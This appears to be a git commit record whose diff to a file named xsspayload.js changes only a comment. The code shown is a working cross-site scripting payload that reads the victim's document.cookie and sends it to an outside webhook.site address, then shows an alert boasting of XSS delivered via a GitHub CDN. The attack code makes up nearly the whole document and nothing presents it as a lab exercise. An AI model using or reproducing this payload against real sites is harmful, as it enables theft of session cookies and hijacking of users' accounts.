a1cfc18a354a80c7314666b511530a3cdd37b10f
zaid111A <55982555+zaid111A@users.noreply.github.com>
2025-05-05 01:10:29 +0300

    better old

--- xsspayload.js
+++ xsspayload.js
@@ -1,4 +1,4 @@
-// Reliable XSS Payload - Executes Immediately
+// Final Version: Immediate Execution
 new Image().src = "https://bab6baf9-25da-4e4a-8c5c-6bbb9c589995.webhook.site/from=cdn-js&cookie=" + encodeURIComponent(document.cookie);
 alert("🔥 XSS via GitHub CDN!");
 console.log("✅ Payload executed after sending to Webhook");
